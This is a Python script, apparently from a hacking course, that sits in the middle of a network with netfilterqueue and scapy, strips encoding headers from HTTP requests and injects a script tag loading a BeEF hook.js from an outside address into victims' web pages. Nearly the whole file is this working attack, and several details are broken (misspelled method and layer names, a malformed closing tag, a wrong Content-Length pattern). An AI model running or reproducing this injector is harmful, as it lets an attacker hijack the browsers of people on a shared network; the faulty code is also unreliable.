#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


# @ Requires a packet and a string
# @ ensures delete the line, the checksums et set the load part of the packet
# (each device is qualified by a dictionary including its ip and mac address)
# @ raises nothing
def set_load(packet, load):
    packet[scapy.raw].load = load
    # del this to be calculated anew
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # scapy convert the package into a scapy packet and we will able to interact with it
    # get_payloads adds the content of the packets on the screen
    scapy_packet = scapy.IP(packet.get_payloads)
    # HTTP data is in the raw layer
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        load = scapy_packet[scapy.Raw].load
        # port 80 equal web
        # dport for request
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Re quest")
            # modify load : delete the encoding part | work in raw layer
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

        # sport for response
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response file")

            # injection java script code for beef
            injection_code = '<script src="http://10.20.14.213:3000/hook.js"><script>'

            # replace html code by injecting an alert
            load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")

            # avoid the issue of limited text(inject code change the size of the code but content_length doesn't change)
            # the program/page will be stop if there is more characters than the limit
            # in the regex (?: used to find the pattern but will not be returned
            content_length_search = re.search("(?:Content_Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(0)

                # calculate the new length
                new_content_length = int(content_length) + len(injection_code)

                # update on the load the change of length
                load = load.replace(content_length, str(new_content_length))

        # if the value of load changed, set the packet with the new load
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            # set packet
            packet.set_payload(str(new_packet))
    # we accept the packet modify and forward it for the destination
    packet.accept()


# create an instance of a net filter queue objet
queue = netfilterqueue.NetfilterQueue()
# connect this object with the queue that we create (iptables -I FORWARD -j NFQUEUE --gueue-num 0)
# 0 because we used number 0 for the queue
# with a callback function to execute on each packet that will be trapped in this queue right
queue.bind(0, process_packet)
# run the queue
queue.run()
